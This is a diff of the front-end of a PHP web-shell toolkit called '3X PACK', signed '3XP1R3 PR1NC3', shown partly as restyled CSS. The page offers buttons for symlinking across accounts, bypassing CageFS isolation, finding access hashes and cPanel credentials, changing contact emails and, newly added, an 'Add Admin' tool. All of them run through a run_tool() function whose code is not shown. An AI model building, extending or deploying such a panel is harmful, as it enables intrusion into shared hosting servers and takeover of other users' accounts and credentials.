-        .list-mini div { background: #000; padding: 5px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
-        .list-mini small { color: var(--success); margin-right: 5px; }
-        .list-mini a { color: #888; text-decoration: none; }
-        .list-mini a:hover { color: #fff; }
-
-        footer { text-align: center; margin-top: 30px; font-size: 10px; color: #333; }
+        :root { --bg:#050505; --card:#101010; --border:#222; --accent:#eee; --text:#888; --suc:#2ecc71; --err:#e74c3c; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:var(--bg);color:var(--text);font-family:'Roboto Mono',monospace;font-size:11px;padding:10px;display:flex;justify-content:center}
+        .wrap{width:100%;max-width:800px}
+        header{display:flex;justify-content:space-between;align-items:center;padding:10px;border-bottom:1px solid var(--border);margin-bottom:15px}
+        h1{color:#fff;font-size:14px}
+        .tag{background:var(--card);padding:3px 6px;border:1px solid var(--border);font-size:10px;color:#555}
+        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;margin-bottom:20px}
+        .card{background:var(--card);border:1px solid var(--border);color:#666;padding:10px;text-align:center;cursor:pointer;border-radius:4px;height:70px;display:flex;flex-direction:column;justify-content:center;align-items:center;transition:0.2s}
+        .card:hover,.card.active{border-color:#444;color:#fff;background:#151515}
+        .card i{font-size:18px;margin-bottom:5px;color:#444}
+        .card:hover i,.card.active i{color:#fff}
+        .console{background:var(--card);border:1px solid var(--border);padding:15px;border-radius:4px}
+        .btn-action{background:#fff;color:#000;border:none;width:100%;padding:8px;font:inherit;font-weight:bold;cursor:pointer;border-radius:3px}
+        .mini-input{width:100%;background:#000;border:1px solid var(--border);padding:8px;color:#fff;margin-bottom:8px;font:inherit;outline:none}
+        .mini-input:focus{border-color:#555}
+        .msg{padding:10px;margin-top:5px;border:1px solid transparent}
+        .msg.success{background:rgba(46,204,113,0.1);color:var(--suc);border-color:rgba(46,204,113,0.2)}
+        .msg.error{background:rgba(231,76,60,0.1);color:var(--err);border-color:rgba(231,76,60,0.2)}
+        .list-mini{display:flex;flex-direction:column;gap:4px;max-height:250px;overflow-y:auto}
+        .list-mini div{background:#000;padding:5px;border:1px solid var(--border);display:flex;justify-content:space-between}
+        a{color:#888;text-decoration:none}a:hover{color:#fff}
     </style>
 </head>
 <body>
-
 <div class="wrap">
-    <header>
-        <h1>3X PACK</h1>
-        <div class="meta">
-            <div class="tag"><i class="fas fa-server"></i> <?= $_SERVER['HTTP_HOST'] ?></div>
-            <div class="tag"><i class="fas fa-user"></i> <?= get_current_user() ?></div>
-        </div>
-    </header>
-
+    <header><h1>3X PACK</h1><div class="tag"><i class="fas fa-server"></i> <?= $_SERVER['HTTP_HOST'] ?></div></header>
     <form method="GET" class="grid">
-        <button type="submit" name="tool" value="Symlinker" class="card <?= $current_tool=='Symlinker'?'active':'' ?>">
-            <i class="fas fa-link"></i><span>Symlink</span>
-        </button>
-        <button type="submit" name="tool" value="CageFS Symlinker" class="card <?= $current_tool=='CageFS Symlinker'?'active':'' ?>">
-            <i class="fas fa-project-diagram"></i><span>CageFS Sym</span>
-        </button>
-        <button type="submit" name="tool" value="Jumper" class="card <?= $current_tool=='Jumper'?'active':'' ?>">
-            <i class="fas fa-frog"></i><span>Jumper</span>
-        </button>
-        <button type="submit" name="tool" value="CageFS Jumper" class="card <?= $current_tool=='CageFS Jumper'?'active':'' ?>">
-            <i class="fas fa-box-open"></i><span>CageFS Jump</span>
-        </button>
-        <button type="submit" name="tool" value="CageFS Bypasser" class="card <?= $current_tool=='CageFS Bypasser'?'active':'' ?>">
-            <i class="fas fa-user-slash"></i><span>Bypass</span>
-        </button>
-        <button type="submit" name="tool" value="Access Hash Finder" class="card <?= $current_tool=='Access Hash Finder'?'active':'' ?>">
-            <i class="fas fa-key"></i><span>Hash</span>
-        </button>
-        <button type="submit" name="tool" value="CageFS Access Hash Finder" class="card <?= $current_tool=='CageFS Access Hash Finder'?'active':'' ?>">
-            <i class="fas fa-fingerprint"></i><span>Cg Hash</span>
-        </button>
-        <button type="submit" name="tool" value="Automatic CP Finder" class="card <?= $current_tool=='Automatic CP Finder'?'active':'' ?>">
-            <i class="fas fa-search"></i><span>CP Finder</span>
-        </button>
-        <button type="submit" name="tool" value="CageFS Automatic CP Finder" class="card <?= $current_tool=='CageFS Automatic CP Finder'?'active':'' ?>">
-            <i class="fas fa-network-wired"></i><span>Cg CP</span>
-        </button>
-        <button type="submit" name="tool" value="Contactemail Changer" class="card <?= $current_tool=='Contactemail Changer'?'active':'' ?>">
-            <i class="fas fa-at"></i><span>Email</span>
-        </button>
+        <?php 
+        $tools = [
+            'Symlinker'=>'link', 'CageFS Symlinker'=>'project-diagram', 'Jumper'=>'frog', 
+            'CageFS Jumper'=>'box-open', 'CageFS Bypasser'=>'user-slash', 
+            'Access Hash Finder'=>'key', 'CageFS Access Hash Finder'=>'fingerprint',
+            'Automatic CP Finder'=>'search', 'CageFS Automatic CP Finder'=>'network-wired',
+            'Contactemail Changer'=>'at', 'Add Admin'=>'user-plus'
+        ];
+        foreach($tools as $name => $icon) {
+            $act = ($current_tool == $name) ? 'active' : '';
+            echo "<button type='submit' name='tool' value='$name' class='card $act'><i class='fas fa-$icon'></i><span>$name</span></button>";
+        }
+        ?>
     </form>
-
     <?php if($current_tool): ?>
     <div class="console">
-        <div class="console-head">> <?= strtoupper($current_tool) ?></div>
+        <div style="border-bottom:1px solid #222;padding-bottom:8px;margin-bottom:10px;font-weight:bold;color:#fff">> <?= strtoupper($current_tool) ?></div>
         <?= run_tool($current_tool) ?>
     </div>
     <?php endif; ?>
-
-    <footer>3XP1R3 PR1NC3 | COMPACT EDITION</footer>
+    <footer style="text-align:center;margin-top:30px;font-size:10px;color:#333">3XP1R3 PR1NC3</footer>
 </div>
-
 </body>
 </html>
+
